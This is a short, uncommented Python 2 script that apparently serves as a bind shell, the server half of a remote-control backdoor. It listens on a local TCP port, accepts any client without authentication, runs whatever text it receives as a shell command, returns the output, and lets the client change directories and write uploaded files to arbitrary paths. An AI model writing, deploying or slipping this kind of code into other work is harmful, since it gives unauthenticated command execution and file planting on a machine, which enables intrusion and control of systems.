#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import os
import subprocess
import sys
import time
from datetime import datetime


def Execute(command):
	p = subprocess.Popen([command],stdout=subprocess.PIPE, stderr=subprocess.PIPE , shell=True)
	return p.stdout.read()

if __name__ == '__main__':
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind(('127.0.0.1', 152))
		s.listen(1)
		while True:
			con, cli = s.accept()
			print 'Connected ', cli
			while True:
				data = con.recv(1024)
				if data[:7] == 'whereis':
					con.send(os.getcwd())
				elif data[:3] == 'cd ':
					din = data.split(' ', 1)
					print din[1]
					try:
						os.chdir(din[1])
						con.send(os.getcwd())
					except os.error as e:
						con.send(str(e))
						pass
				elif data[:5] == 'rexit':
					break
					print 'Closed Connection, waiting...'
				elif data[:8] == 'rootexit':
					sys.exit(0)
				elif data[:8] == 'sendfile':
					print 'Waiting for...'
					con.send('ready')
					l = con.recv(1024)
					f = open(l, 'wb')
					l = con.recv(1024)
					while(l):
						print 'Receiving..'
						f.write(l)
						l = con.recv(1024)
					f.close()
					print 'Received..'
					break
				while data != '':
					r = Execute(data)
					con.send(r)
					print 'Executed..'
					break
	except KeyboardInterrupt:
		s.close()
		print 'Closing..'
	except socket.error as e:
		print ':>', e

